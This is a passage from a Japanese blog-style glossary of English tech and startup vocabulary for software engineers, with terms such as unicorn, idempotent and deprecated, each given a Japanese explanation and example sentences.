映画マトリックスの世界、電脳を実現する新会社 <a href="http://www.thedrive.com/tech/8751/elon-musks-new-company-neuralink-looks-to-upgrade-your-brain-with-ai-tech" rel="nofollow noopener" target="_blank">Neuralink</a>の立ち上げ</p>

<p><strong>ex-Googler</strong><br>
元グーグル社員。元グーグル社員が立ち上げたスタートアップとかの文脈で使用される。</p>

<blockquote>
<p>ex-wife, ex-girlfriend<br>
ex だけでも使用される</p>
</blockquote>

<p><strong>JavaScript Fatigue</strong><br>
React、AngularJSなど、最近のJavaScriptフレームワーク、ライブラリは、ちょっとHello Worldするにも、Webpack, Babel, Scss, Gulpなどなど環境設定が大変で疲れる(Fatigue)の意味。</p>

<p><strong>Ken Burns Effect</strong><br>
ドキュメンタリー映像でKen Burnが多用したパンやズームを使用した<a href="https://en.wikipedia.org/wiki/Ken_Burns_effect" rel="nofollow noopener" target="_blank">映像効果</a></p>

<p><strong>purple cow</strong><br>
紫の牛。目立つこと。<br>
マーケティングで有名なセスゴーディンが、マーケティングに必要なP</p>

<blockquote>
<p>Price, Product, Position, Promotion, Packaging, Permission<br>
に無理やり合わせるために、Remarkable目立つこと、をPurple cowと命名した。</p>
</blockquote>

<p><strong>pitch</strong><br>
シリコンバレーで使用される言葉。スタートアップの経営者が、投資家の前で資金集めのためプレゼンテーションすること。</p>

<blockquote>
<p>elevator pitch, pitch talk 営業さんがするセールストーク</p>
</blockquote>

<p><strong>angel, venture capital</strong><br>
エンジェル投資家とベンチャーキャピタル<br>
両者とも株式上場前のスタートアップ企業に投資し、IPO後に高値で株式を売却する。<br>
エンジェルは個人投資家で数百から千万円の小規模、VCは会社組織で、億円単位の大規模投資になる。<br>
ピーターティエールはフェイスブックに、50万ドル投資し、IPO後に10億ドルで売却している。<br>
17歳の高校生が作ったアプリSummly(ヤフーが30億円で買収した)にオノヨーコは出資している。<br>
ドラマ、<a href="https://www.youtube.com/watch?v=69V__a49xtw" rel="nofollow noopener" target="_blank">シリコンバレー</a>では、パイドパイパーのリチャードにアーリックは家と生活費を提供しているエンジェルである。</p>

<p><strong>unicorn</strong><br>
頭にツノが生えてる馬みたいな架空の生き物。レアキャラ<br>
上場前のスタートアップ企業で、<a href="http://fortune.com/unicorns/" rel="nofollow noopener" target="_blank">評価額が１０億ドルを超えた企業</a><br>
最近では<code>Snapchat</code>が３月にIPOをした。日本企業ではメルカリがユニコーンである。<br>
日本語で言えば、金のなる木、金の卵を産むにわとり。</p>

<p><strong>rocket science</strong><br>
めちゃくちゃ難しいこと。無理ゲー。<br>
否定文で使用し、それはそんな難しいことではない、と言いたいときに使う。</p>

<blockquote>
<p>Let's learn Android and iOS. It's not rocket science.<br>
反) no big deal 大したことない</p>
</blockquote>

<p><strong>democratization</strong><br>
民主化<br>
最近の人工知能、機械学習ブームでよく使われる。<br>
data democratization 一部の特権階級だけでなく、一般人にもデータを解放する<br>
TensorFlowライブラリによって、一部の学者やスーパーエンジニアだけでなく、普通のエンジニアでも機械学習ができるようになった。</p>

<p><strong>organic and paid search results</strong><br>
Google検索結果の種類。<br>
paidは一番上にくる広告<br>
organicは公平な検索結果</p>

<p><strong>ABC cycle</strong><br>
Google Analyticsで使用される、Acquisition(獲得),  Behavior(行動), Conversion(転換)<br>
Aは、どうやってお店を見つけましたか。つまり、検索結果、Paidサーチ、SNS、ブログ、メール、直接<br>
Bは、実際にリンクを踏んで、サイトにやってくる、そしてページを色々閲覧すること<br>
Cは、アマゾンであれば、ショッピングカートに商品を入れて購入まですること<br>
ABCがスムーズに流れることが重要である。</p>

<p><strong>clickbait, click bait</strong><br>
SNSやブログなどのタイトルで読者に読んでもらうために大げさな表現をして、読者を釣ること。(baitとは釣りの餌のとこ)<br>
例えば、<code>You won’t believe</code>などで始める。<br>
<a href="https://techcrunch.com/2016/09/25/wtf-is-clickbait/" class="autolink" rel="nofollow noopener" target="_blank">https://techcrunch.com/2016/09/25/wtf-is-clickbait/</a></p>

<p><strong>sustainable</strong><br>
ビジネスの意味では、長期に渡って継続が可能の意味。一時的なブームや、法の目をかいくぐったビジネスモデルでは長続きしない。<br>
環境を破壊せずに開発をすると言う意味もある。(資源を食いつぶしてしまい、次世代まで続かない。)</p>

<p><strong>Generation X, Y (Millennials) and Z</strong><br>
日本で言えば、ゆとり世代、新人類、団塊の世代のように、同じ時代を生き、同じ時代の変化を経験した人たちをカテゴリで分けたもの。cohortともいう。</p>

<blockquote>
<p>Gen X 1966-1976<br>
Gen Y (Millennials) 1977-1994<br>
Gen Z 1995-2012<br>
アメリカではGen Zが人口の25%を占めており、彼らはテレビでなくYouTubeなどのストリーミングで育ち、スマフォでスナップチャットでコミュニケーションを取る。</p>
</blockquote>

<p><strong>Amazon eats the world</strong><br>
アマゾンの勢いが止まらない。アメリカのショッピングモールの売り上げが低迷しているようで、小売業が大きく変わろうとしている。<br>
アマゾン一社でフルフィルメントを完全自動化できる。Amazon Echoで商品を受注し、AWSで受発注、在庫、発送、顧客管理し、ロボットで商品のピッキング、ドローンでデリバリー。人間がいらなくなる。</p>

<p><strong>archrival</strong><br>
宿命のライバル。ヤンキースとレッドソックス</p>

<p>アップルとマイクロソフト<br>
グーグルとアップル<br>
グーグルとアマゾン</p>

<p><strong>Edge Computing and Fog Computing</strong><br>
エッジコンピューティング、フォグコンピューティング<br>
今後、IoT、ロボット、自動運転、などのリアルタイム性が要求されるデバイスが増えてくる。<br>
物理的な距離が遠いクラウドではなく、その中間地点にエッジサーバを配置する。(CDNのエッジサーバと考え方は同じ)<br>
シスコでは、それらのエッジの分散技術をフォグコンピューティングと呼ぶ。<br>
これまでの、Webブラウザ → Webサーバのアーキテクチャから<br>
IoTなどのユーザデバイス → エッジサーバ → クラウドのマイクロサービスといった形になる<br>
また、ユーザデバイス間で通信、例えば、ロボットや自動車同士が会話したり、ロボットがIoT機器を制御することもある</p>

<p><strong>Goldilock</strong><br>
ちょうどいいとこ。適度<br>
<code>Goldilock economy</code> 加熱もせず、冷え込みすぎず、ちょうどいい緩やかな経済成長状態。<br>
イギリスの童話<code>三匹のくま</code>からきてる。</p>

<p><strong>Beam me up Scotty</strong><br>
映画スタートレックで、外にいるときに宇宙船に瞬間転送して欲しいときに言うセリフ<br>
ピンチを脱したいときに、助けて！という意味もある<br>
Scotは転送担当のエンジニア<br>
スタートレックとスターウォーズ関係のパロディはよく使われる</p>

<p><strong>If you build it, he will come</strong><br>
それを作れば、彼はやってくる。<br>
<a href="https://www.youtube.com/watch?v=5Ay5GqJwHF8" rel="nofollow noopener" target="_blank">映画フィールドオブドリームス</a>から。<br>
なんかシステム、サービスを作れば、ユーザはきっと来る。</p>

<p><strong>stand on the shoulders of giants</strong><br>
巨人の肩の上に乗る<br>
ニュートンの言葉で、巨人の肩の上に乗ったので、他人よりも色々と知ることができた。<br>
インターネットで、無料でスタンフォードの講義がみれる時代である。<br>
インドでは学校にいけない貧乏な子供でもインターネットでAndroidなど<br>
プログラミングを勉強している。</p>

<p><strong>Jump on the bandwagon</strong><br>
勝ち馬に乗る。流れに乗る。流行ってるものに便乗する。<br>
Automakers and tech companies are jumping on the bandwagon of driverless cars.</p>

<p><strong>synthetic</strong><br>
合成の、人口の、シンセサイザー<br>
Java, Kotlinなどでコンパイラがよしなに自動生成(バイトコードレベルで)する合成メソッド、プロパティ<br>
例えばKotlin では、findViewById("mybutton1")しなくても、mybutton1と言うプロパティが自動的に定義、インジェクトされる。</p>

<p><strong>emulator と simulator</strong><br>
Androidはエミュレータ、iOSはシミュレータを使用する。<br>
エミュレータの場合、実機と同じバイナリで動作するため再現性が高い。<br>
シミュレータは見た目の部分だけを真似るだけで、中の実装を適当に模倣している。モック的。再現性は低いらしい。<br>
ただしXcodeのiOSシミュレータはmacOSとiOSが似てるため再現性は高い。(アップルはmacOS以外のプラットフォームでのビルドを認めていない。)</p>

<h2>
<span id="動詞" class="fragment"></span><a href="#%E5%8B%95%E8%A9%9E"><i class="fa fa-link"></i></a>動詞</h2>

<p><strong>invoke</strong><br>
呼び出す。メソッドやAPIを<code>呼び出す</code></p>

<blockquote>
<p>類) call<br>
Ajax allows you to invoke Rest APIs.</p>
</blockquote>

<p><strong>dispatch</strong><br>
タスクを割り振る。</p>

<blockquote>
<p>類) delegate</p>
</blockquote>

<p><strong>provide</strong><br>
提供する。機能や仕組みを提供する。</p>

<blockquote>
<p>Storyboard provides variety of UI components.</p>
</blockquote>

<p><strong>use, make use of, employ, leverage, take advantage of, get the most out of it</strong><br>
利用する。活用する。</p>

<blockquote>
<p>This application employs ReactJS.</p>
</blockquote>

<p><strong>run, execute, perform, conduct</strong><br>
実行する、実施する</p>

<p><strong>work</strong><br>
(システムが)ちゃんと動く。動作する。バグってない。</p>

<blockquote>
<p>Does it work? 動く？<br>
No, it does not work. いや、だめ。</p>
</blockquote>

<p><strong>manipulate</strong><br>
処理する。操作する。<br>
HTTPリクエストを処理する。GUIを操作する。</p>

<blockquote>
<p>類) handle, deal with<br>
Node.js allows you to deal with HTTP requests.</p>
</blockquote>

<p><strong>declare, define</strong><br>
宣言する。定義する。変数を宣言する。メソッドを定義する。</p>

<blockquote>
<p>This class defines a variable Employee as string.</p>
</blockquote>

<p><strong>determine</strong><br>
決定する</p>

<blockquote>
<p>This flag determines if the entity exists or not.</p>
</blockquote>

<p><strong>override</strong><br>
メソッドのオーバーライド。オブジェクト指向言語にて、親クラスで実装したメソッドを、サブクラスで上書きすること。</p>

<blockquote>
<p>Swift and Java allows you to override methods.</p>
</blockquote>

<p><strong>conform</strong><br>
準拠する。クラスがインターフェースを実装(準拠)する。</p>

<blockquote>
<p>This class needs to conform the EventListener interface.</p>
</blockquote>

<p><strong>adopt</strong><br>
採用する。</p>

<blockquote>
<p>We adopt React for the new system.</p>
</blockquote>

<p><strong>adapt</strong><br>
適応する。順応する。</p>

<blockquote>
<p>類) embrace<br>
Embrace new JavaScript technologies such as React.</p>
</blockquote>

<p><strong>acknowledge</strong><br>
認める。認知する。</p>

<blockquote>
<p>類) accept, detect<br>
Replication servers needs to acknowledge the update on the master.</p>
</blockquote>

<p><strong>embrace</strong><br>
受け入れる。許容する。</p>

<blockquote>
<p>We have to embrace AI. 我々は人工知能を受け入れなければならない。</p>
</blockquote>

<p><strong>indicate</strong><br>
意味する。指し示す。</p>

<blockquote>
<p>The flag indicates that users can access the data or not.</p>
</blockquote>

<p><strong>specify</strong><br>
指定する。設定する。</p>

<blockquote>
<p>In the text field, you need to specify an IP address.</p>
</blockquote>

<p><strong>distinguish</strong><br>
識別する。見分ける</p>

<blockquote>
<p>類) tell A from B<br>
It is hard to distinguish the button A from the button B.</p>
</blockquote>

<p><strong>differentiate</strong><br>
区別する。</p>

<blockquote>
<p>How can we differentiate one device user from another?</p>
</blockquote>

<p><strong>fetch/retrieve</strong><br>
データを取得する。データベースからレコードを取得する。</p>

<blockquote>
<p>This API fetches data from Oracle DB.</p>
</blockquote>

<p><strong>emit</strong><br>
ログを出力する。</p>

<blockquote>
<p>Logger emits log files in /var/log</p>
</blockquote>

<p><strong>ensure</strong><br>
確認する。確かめる。</p>

<blockquote>
<p>類) make sure. verify. exam<br>
Please ensure that the server is up and running.</p>
</blockquote>

<p><strong>validate, verify</strong><br>
正しいかどうか検証する。</p>

<blockquote>
<p>The validator validates that input values are correct.</p>
</blockquote>

<p><strong>figure out, reveal, demistify</strong><br>
理解する。分かる。解明する。調べる。解き明かす。</p>

<blockquote>
<p>We need to figure out what's going on.</p>
</blockquote>

<p><strong>streamline</strong><br>
手順、やり方、などを見直して効率化する。</p>

<blockquote>
<p>We need to streamline a way to proceed the project.</p>
</blockquote>

<p><strong>vet, investigate</strong><br>
吟味する。調べる。<br>
獣医が動物を診察すると言う意味。</p>

<blockquote>
<p>Let's find and vet Web APIs that we can use in our app.<br>
類) go over, look into, study, exam</p>
</blockquote>

<p><strong>substitute</strong><br>
置換する。置き換える。</p>

<blockquote>
<p>substitute the hostname appropriately.<br>
$ ping <a href="http://www.abc.com" rel="nofollow noopener" target="_blank">www.abc.com</a></p>
</blockquote>

<p><strong>elaborate</strong><br>
(バグやシステム障害の説明がザックリすぎで何言ってるのか謎なときに) もっと詳しく説明せよ</p>

<blockquote>
<p>類) be more specific. explain more details about it.<br>
Could you please elaborate it? I have no idea what is going on.</p>
</blockquote>

<p><strong>bump</strong><br>
バージョンを上げる。板に書き込んで古いスレッド順位を上げる。</p>

<blockquote>
<p>We need to bump the version of Go to 1.7</p>
</blockquote>

<p><strong>contain</strong><br>
含む。もつ。</p>

<blockquote>
<p>類) have, consists of, fall into, comprise<br>
This class contains a proxy class.</p>
</blockquote>

<p><strong>represent</strong><br>
表す。表現する。</p>

<blockquote>
<p>This table represents an employee entity.</p>
</blockquote>

<p><strong>hook up A to B</strong><br>
AをBに接続する</p>

<blockquote>
<p>類) get A wired with B, harness A to B, integrate A with B<br>
hook up my computer to the internet</p>
</blockquote>

<p><strong>head over to</strong><br>
アプリの操作説明などしているときに、「設定画面を開いて」と言いたいときに、Let's head over to the settings page. とかいう。<br>
Webブラウザで、Yahoo!のページを開くとかの場合も、Head over to Yahoo! web pageという。</p>

<blockquote>
<p>類) refer to, go to<br>
For more details head over to <a href="https://www.yahoo.com" class="autolink" rel="nofollow noopener" target="_blank">https://www.yahoo.com</a></p>
</blockquote>

<p><strong>beef up, ramp up</strong><br>
肉付け。システムを強化したり、ドキュメントを充実させる意味。</p>

<blockquote>
<p>AWS ramps up in AI with new consultancy services and Rekognition features.</p>
</blockquote>

<p><strong>ditch</strong><br>
廃止する。捨てる。やめる。</p>

<blockquote>
<p>類) stop, quit, give up<br>
We have to ditch the legacy system asap.</p>
</blockquote>

<p><strong>defer, postpone, put off, delay</strong><br>
遅らせる。</p>

<blockquote>
<p>deferred execution 遅延実行<br>
類) lazy loading</p>
</blockquote>

<p><strong>dig into</strong><br>
掘る。あさる。ドキュメントやソースコードをよく調べるの意味。</p>

<blockquote>
<p>Let's dig deep into the source codes to get better understanding of the system.<br>
類) delve into, deep dive</p>
</blockquote>

<p><strong>occur</strong><br>
エラーが発生する。問題が発生する。</p>

<p><strong>disrupt</strong><br>
サービスの停止。ぶち壊す。破壊的創造。<br>
シリコンバレーでは、Tech Crunch Disrupt という、有名なスタートアップ企業のお祭りがある。</p>

<blockquote>
<p>類) outage<br>
サービスの停止。破壊。</p>
</blockquote>

<p><strong>deteriorate</strong><br>
(パフォーマンス、品質の)悪化する<br>
The server performance has deteriorated</p>

<p><strong>mitigate</strong><br>
(トラブルなど悪い状態を)緩和する<br>
We need to come up with an idea to mitigate DDoS attacks.</p>

<p><strong>gear up</strong><br>
車のギアアップ。リリースに向けて、加速する、準備する。</p>

<blockquote>
<p>類) get ready for</p>
</blockquote>

<p><strong>seem</strong><br>
みたいな。感じ。とか、主張、語尾を和らげたいときや、自信がないときに使用する。逃げ。</p>

<blockquote>
<p>The system cannot seem to work correctly.<br>
It may seem like a bad idea.</p>
</blockquote>

<p><strong>stuck</strong><br>
stickの過去分詞。 バグや、仕事にどハマりすること。渋滞にはまるとかにも使用する。<br>
stick to で何かにこだわるの意味。</p>

<blockquote>
<p>I've got stuck with the issue.</p>
</blockquote>

<p><strong>raise</strong><br>
スタートアップ企業がベンチャーキャピタルから出資金を集めること。<br>
ステージごとに、シリーズ A, B, C.. という。<br>
ベンチャー企業は和製英語で、<code>start up companies</code>が正しい。<br>
venture capital(VC)とは、投資家からの出資金。</p>

<p><strong>infer</strong><br>
推測する。GoやSwiftは静的型づけ言語であるが、コンパイラが型を推測(infer)してくれる。</p>

<blockquote>
<p>名詞) inference</p>
</blockquote>

<p><strong>hoist</strong><br>
釣り上げる。UFOキャッチャーのクレーン。<br>
JavaScriptの変数宣言が関数スコープ内のどこで宣言しようと、一番最初に宣言したと見なされる仕組み。変数の吊り上げ。<br>
<a href="https://www.w3schools.com/js/js_hoisting.asp" class="autolink" rel="nofollow noopener" target="_blank">https://www.w3schools.com/js/js_hoisting.asp</a></p>

<p><strong>care about</strong><br>
気になる。興味がある。関心がある。</p>

<blockquote>
<p>I care about iOS developments.<br>
I don't care about developing Android apps.</p>
</blockquote>

<p><strong>zero in on</strong><br>
集中する</p>

<blockquote>
<p>類) focus, concentrate</p>
</blockquote>

<p><strong>reproduce, duplicate</strong><br>
バグを再現する</p>

<p><strong>sort out, address</strong><br>
バグ、問題を解決する。</p>

<blockquote>
<p>類) fix</p>
</blockquote>

<p><strong>revamp</strong><br>
(システムを)改修する</p>

<blockquote>
<p>類) enhance, improve, make it better</p>
</blockquote>

<p><strong>refurbish RFB</strong><br>
修理調整する。<br>
<code>refurbished iPhone</code> 欠陥品を修理して安く販売している</p>

<p><strong>tweak</strong><br>
調整する。設定ファイルのパラメータを調整する。</p>

<blockquote>
<p>類) adjust</p>
</blockquote>

<p><strong>tailor</strong><br>
(データを)加工する。手を加える。カスタマイズする。<br>
洋服のオーダーメイドは和製英語。正しくはtailor made</p>

<blockquote>
<p>類) customize<br>
This method tailors the JSON data.</p>
</blockquote>

<p><strong>leave</strong><br>
leaveは文脈によって２つの意味があり間違えやすい。<br>
leave it as it is そのままにしておく。削除しない。<br>
leave the default settings. leave it as default. デフォルト設定のまま、いじらない、そのままにしとく。<br>
leave it out of it. そこから削除する。<br>
I leave you. もう行くよ。(じゃあね。)</p>

<p><strong>sneak peek of </strong><br>
開発途中のプロダクトやアプリを、(イベントなどで)チラ見せすること。先行上映。<br>
sneakyとはずる賢いという意味。</p>

<p><strong>stand for</strong><br>
略語がxxx意味する。</p>

<blockquote>
<p>COB stands for Close Of Business. <br>
COBは営業終了時間を意味します。</p>
</blockquote>

<p><strong>play around with</strong><br>
いじってみよう。触ってみよう。</p>

<blockquote>
<p>Let's play around with Xcode.</p>
</blockquote>

<p><strong>bear with me</strong><br>
ちょっとの我慢です。辛抱してね。<br>
bear とは熊の意味であるが、辛抱するという意味がある。<br>
プレゼンテーションでシステムの説明の冒頭で、ちょっと長くて難しいけど寝ないで頑張って付いてきてね。と使用する。</p>

<blockquote>
<p>Please bear with me a while.</p>
</blockquote>

<p><strong>used to be</strong><br>
以前はそうだった。(今はもう違う)</p>

<blockquote>
<p>I used to smoke. 昔はタバコを吸ってた。<br>
Java used to be de facto standard language to develop web applications. <br>
Webアプリの事実上の標準言語は以前はJavaだった。</p>
</blockquote>

<p><strong>be used to</strong><br>
〜に慣れている。慣れっこ。</p>

<blockquote>
<p>I am used to working late.<br>
遅くまで働くのは慣れっこだよ。</p>
</blockquote>

<p><strong>go after</strong><br>
つけ狙う。ストーカーする(追われる)。ライバル企業を狙い撃ちする。</p>

<blockquote>
<p>Google goes after Amazon with cloud business.</p>
</blockquote>

<p><strong>have yet to do</strong><br>
(存在はする、しないといけないが)まだそこに至ってない。<br>
notが付いてないが否定の意味になる。</p>

<blockquote>
<p>Solutions have yet to be found.<br>
解決方法はまだ見つかってない。</p>
</blockquote>

<p><strong>remain to be done</strong><br>
(やらないといけないが)まだやってない。</p>

<blockquote>
<p>Those tasks remain to be done. <br>
そのタスクはまだやり残している。</p>
</blockquote>

<p><strong>have nothing to do with</strong><br>
なにも関係がない</p>

<blockquote>
<p>I have nothing to do with the issue. <br>
私はこの問題とは全く関係がない。<br>
ReactJS has nothing to do with frameworks. <br>
ReactJSは、フレームワークとは関係がない。(ビューだけ)</p>
</blockquote>

<p><strong>be supposed to do~</strong><br>
~することになっている。そういう想定、手はず、予定になっている</p>

<blockquote>
<p>I am supposed to do this task. <br>
私はこのタスクをすることになってます。<br>
The APIs are supposed to return JSON encoded data. <br>
このAPIはJSONを返します。(XMLでなく)</p>
</blockquote>

<p><strong>suck</strong><br>
クソだ。下手。つまらん。<br>
フォーマルな場面では使用を避ける。卑猥な意味もある。<br>
ソックと発音する。suckのuは曖昧母音で喉の奥からだす重低音。<br>
日本人には発音が難しいため使用するのは避けた方が良い。</p>

<blockquote>
<p>This app sucks! くそアプリ<br>
I suck. 下手こく<br>
類) screw up 大失敗する。やらかす。</p>
</blockquote>

<p><strong>drain</strong><br>
エネルギーを消耗させる、使い切る。</p>

<blockquote>
<p>GPS intensive applications drain the battery. <br>
GPSを使用するアプリはバッテリを消耗させる。</p>
</blockquote>

<p><strong>memory hog</strong><br>
メモリをたくさん消費する</p>

<blockquote>
<p>類) consume</p>
</blockquote>

<p><strong>noted</strong><br>
了解。気に止めておきます。<br>
部下からの休暇願への返信に、とりあえず、強く肯定はしないけどわかったよ的なニュアンス</p>

<p><strong>hype</strong><br>
盛り上がる。興奮する。ハイになる。</p>

<p><strong>turn out to be, ended up doing, ended up with</strong><br>
(色々やって見て)という結果に終わる。〜と判明する。</p>

<blockquote>
<p>Kotin turns out to be an easier way than Java for Android.<br>
I looked into the bug and I ended up wasting a lot of time.</p>
</blockquote>

<p><strong>prefer B over A</strong><br>
AよりBが好き。</p>

<blockquote>
<p>I prefer Kotlin over Java.<br>
JavaよりKotlinが好き。</p>
</blockquote>

<h2>
<span id="形容詞" class="fragment"></span><a href="#%E5%BD%A2%E5%AE%B9%E8%A9%9E"><i class="fa fa-link"></i></a>形容詞</h2>

<p><strong>individual / each / respective / every single</strong><br>
個々の、それぞれの</p>

<blockquote>
<p>Let's update every single file. (file は単数形にする)</p>
</blockquote>

<p><strong>particular / certain</strong><br>
ある特定の。とある。複数ある中からどれか特定の一つ</p>

<blockquote>
<p>This API update a particular record. <br>
このAPIはどれか特定の１つのレコードだけを更新する。(複数ではなく)</p>
</blockquote>

<p><strong>arbitrary</strong><br>
任意の</p>

<blockquote>
<p>類) any</p>
</blockquote>

<p><strong>given, specified</strong><br>
与えられた。渡された。指定された。引数として渡されたパラメータ。</p>

<blockquote>
<p>This API allows you to get a recored of a given ID.</p>
</blockquote>

<p><strong>isomorphic</strong><br>
同じ、同一、均一</p>

<blockquote>
<p><code>Isomorphic Javascript</code> JavaScriptをクライアント、サーバの両方で使用するアーキテクチャ<br>
<code>Isomorphic ReactJS</code> React Native見たく、ネイティブもReactJSで書く</p>
</blockquote>

<p><strong>idiomatic</strong><br>
お約束、典型的 (その対象領域において)</p>

<blockquote>
<p><code>Idiomatic way to handle async in JavaScript</code><br>
JavaScriptで非同期処理をするお約束のやり方 (Swiftでなく)<br>
<code>Idiomatic English</code><br>
アメリカ人が話すナチュラルな英語 (インド人英語とかでなく)<br>
類) typical</p>
</blockquote>

<p><strong>vulnerable</strong><br>
脆弱。傷つきやすい。ハックされやすいシステム</p>

<p><strong>malicious</strong><br>
悪意ある</p>

<blockquote>
<p>There are a lot of malicious requests on our servers.<br>
反) legitimate 合法的な。正規の。</p>
</blockquote>

<p><strong>immutable</strong><br>
不変の、変わらない。<br>
ここ最近の、関数型言語の人気からよく使用される言葉。<br>
オブジェクト指向は異なり、関数、メソッドで、オリジナルの引数は変更せず<br>
戻り値として新しいオブジェクトを返す。</p>

<blockquote>
<p>反) mutable, side effect</p>
</blockquote>

<p><strong>awesome, incredible, impressive, terrific, amazing, cool, super-duper</strong><br>
すげー、すごいの形容詞</p>

<blockquote>
<p>awesome font すごいフォント</p>
</blockquote>

<p><strong>full stack</strong><br>
フルスタック。フルスタックエンジニアとは、アプリだけでなくインフラ周りとかも担当するエンジニア。</p>

<blockquote>
<p>類) full fledge</p>
</blockquote>

<p><strong>idempotent</strong><br>
べき等性。何度実行しても結果が同じであること。間違ってダブルクリックしてもショッングカートにアイテムが一つしか入らなければべき等。<br>
PKが設定してあるテーブルで、同じINSERT文を実行すればプライマリキー制約でガードされるのでべき等である。<br>
レコードが2つできてしまう場合、それはべき等とは言えない。</p>

<p><strong>particular / certain</strong><br>
特定のどれか。(複数ある中から)ある特定の一つ</p>

<blockquote>
<p>This function allows you to delete a particular file.<br>
This API updates a particular record.</p>
</blockquote>

<p><strong>stable</strong><br>
安定した</p>

<blockquote>
<p>The system is not stabled.</p>
</blockquote>

<p><strong>authentic</strong><br>
(偽物でなく)本物</p>

<blockquote>
<p>反) fake, bogus, dummy<br>
Use a bogus server instead of the production server.</p>
</blockquote>

<p><strong>bogus</strong><br>
偽物、ダミー<br>
bogus server テスト用に使用するダミーサーバ</p>

<p><strong>tentative, temporary</strong><br>
仮の、一時的な</p>

<blockquote>
<p>tentative file 仮のファイル</p>
</blockquote>

<p><strong>outstanding</strong><br>
２つの意味がある。<br>
未解決の、素晴らしい </p>

<blockquote>
<p>outstanding issues 未解決の問題(バグ)<br>
outstanding idea 素晴らしいアイデア</p>
</blockquote>

<p><strong>trivial</strong><br>
些細な。小さい。取るに足らない。</p>

<blockquote>
<p>We don't need to fix those trivial defects.</p>
</blockquote>

<p><strong>thin</strong><br>
薄い。<br>
Thin client シン クライアント<br>
その昔(2000年ちょい前)、Windows VB/VC++(fat client)が全盛期であった頃、Java Webサーブレットを使用してサーバサイドにロジックを移動し、クライアント側は空っぽ(thin)にすることが流行った。今や時代はネイティブアプリ、IoTの時代。。。</p>

<blockquote>
<p>反) thick, fat</p>
</blockquote>

<p><strong>abridged</strong><br>
要約した。縮小版</p>

<blockquote>
<p>abridged version 簡易版<br>
abbreviation, acronym 略語。例) OOP, MVC, CEO<br>
OOP is short for Object Oriented Programming.</p>
</blockquote>

<p><strong>acronym</strong><br>
NASA (National Aeronautics and Space Administration) のように頭文字をとってナサと新たな単語として発音するもの。</p>

<blockquote>
<p>注) IBM(アイ、ビー、エム)は個々のアルファベットを発音するためacronymではない。</p>
</blockquote>

<p><strong>bacronym</strong><br>
Back Acronymとは言葉遊びで、普通の文章の頭文字をとってAcronymにする。</p>

<blockquote>
<p>DRY - Don't repeat yourself</p>
</blockquote>

<p><strong>succinct</strong><br>
簡潔</p>

<blockquote>
<p>類) brief, concise, terse<br>
This tutorial video is so succinct and precise.</p>
</blockquote>

<p><strong>verbose</strong><br>
回りくどい。冗長。<br>
コマンドラインでデバッグ詳細を出力するときの v オプション。</p>

<blockquote>
<p>Java syntax is so verbose.</p>
</blockquote>

<p><strong>redundant</strong><br>
冗長。余計。</p>

<blockquote>
<p>Swift type inference allows you to eliminate redundant types.</p>
</blockquote>

<p><strong>tricky</strong><br>
難しい。難解。</p>

<blockquote>
<p>類) hard, difficult<br>
ReactJS is a bit tricky.</p>
</blockquote>

<p><strong>cumbersome</strong><br>
厄介な、面倒な</p>

<blockquote>
<p>Java is too cumbersome to parse JSON encoded data.</p>
</blockquote>

<p><strong>tedious</strong><br>
退屈な、めんどくさい、単調な(タスク)</p>

<blockquote>
<p>It's s tedious to write unit tests on every single function.<br>
類) daunting</p>
</blockquote>

<p><strong>hectic, busy</strong><br>
忙しい。やることがいっぱい。</p>

<blockquote>
<p>Things got so hectic. とても忙しくなった。<br>
類) I'm tied up with stuff.</p>
</blockquote>

<p><strong>daunting</strong><br>
心が折れそうになる(くらい難しい、物量が多いタスク、事柄)</p>

<blockquote>
<p>類) overwhelmed, overwhelming<br>
Setting up JavaScript ecosystem is daunting task.</p>
</blockquote>

<p><strong>bunch of, a lot of, lots of, many, much, plethora</strong><br>
たくさんの。膨大な</p>

<blockquote>
<p>There are bunch of documentations.</p>
</blockquote>

<p><strong>obsoleted, deprecated, out of date</strong><br>
時代遅れ。もう無効。</p>

<blockquote>
<p>The API is deprecated as of version 3.</p>
</blockquote>

<p><strong>designed</strong><br>
xxx用に設計された。xxx目的、向き。</p>

<blockquote>
<p>Swift is designed to develop iOS applications.<br>
This service is designed for developing countries.</p>
</blockquote>

<p><strong>adjacent</strong><br>
隣り合った。ボタンとかUI部品が隣り合っている。ジェイセントと発音する。</p>

<blockquote>
<p>Place a button adjacent to the textfield.<br>
類) side by side, next to, besides each other</p>
</blockquote>

<p>*<em>associated with, corresponding to, related to *</em><br>
紐づいた、関連した、対応する</p>

<blockquote>
<p>Get all the records that are associated with User A.<br>
Get all the records that are corresponding to User A.<br>
Get all the records that are related to User A.<br>
類) as to</p>
</blockquote>

<p><strong>saturated</strong><br>
飽和した。パフォーマンステストでシステムのスループットの限界点に達した場合、saturatedという。</p>

<p><strong>insufficient</strong><br>
不十分</p>

<blockquote>
<p>反) not enough</p>
</blockquote>

<p><strong>distracting</strong><br>
気を散らせる。集中できないこと。</p>

<blockquote>
<p>Banner advertisements are distracting.</p>
</blockquote>

<p><strong>latest, updated, up-to-date</strong><br>
最新の</p>

<blockquote>
<p>The latest version of Go is 1.8<br>
類) state of the art. state of ReactJS 最新のReactJS技術</p>
</blockquote>

<p><strong>interchangeable</strong><br>
交換可能。可換。同じ。</p>

<blockquote>
<p>The words, argument and parameter are used interchangably.</p>
</blockquote>

<p><strong>cosmetic</strong><br>
化粧から転じて、GUI、見た目。(ロジックに対して)</p>

<blockquote>
<p>cosmetic changes 見た目の変更。うわべだけ変えて、中身は変わってないという皮肉的な意味をもつ。<br>
類) </p>
</blockquote>

<p><strong>practical, viable, pragmatic</strong><br>
実現可能な、現実的な(プラン、アイデア、技術)</p>

<blockquote>
<p>Self-driving car is viable technology.</p>
</blockquote>

<p><strong>explicit</strong><br>
明示的に</p>

<blockquote>
<p>You need to specify the parameter explicitly.<br>
反) implicit</p>
</blockquote>

<p><strong>augmented</strong><br>
拡張した。AR (Augmented Reality)</p>

<p><strong>opaque</strong><br>
不透明</p>

<blockquote>
<p>半) transparent</p>
</blockquote>

<p><strong>crunch</strong><br>
バリバリ(音を立てる)</p>

<blockquote>
<p>crunch the number 計算する。おそらく昔のパンチカードを使用していた時代のコンピュータ。<br>
TechCrunch アメリカの超有名なテックニュースサイト</p>
</blockquote>

<p><strong>fluffy</strong><br>
ふわふわした (Swiftが自動生成するコードに付随するお節介なコメントをfluffyと表現している人がいた。)</p>

<p><strong>sticky</strong><br>
ねちっとした、ひっつく　</p>

<blockquote>
<p>I don't wanna stick to it. 固執したくない。執着したくない。<br>
I got stuck with it. (ドツボに)ハマる。バグ、問題にハマる。</p>
</blockquote>

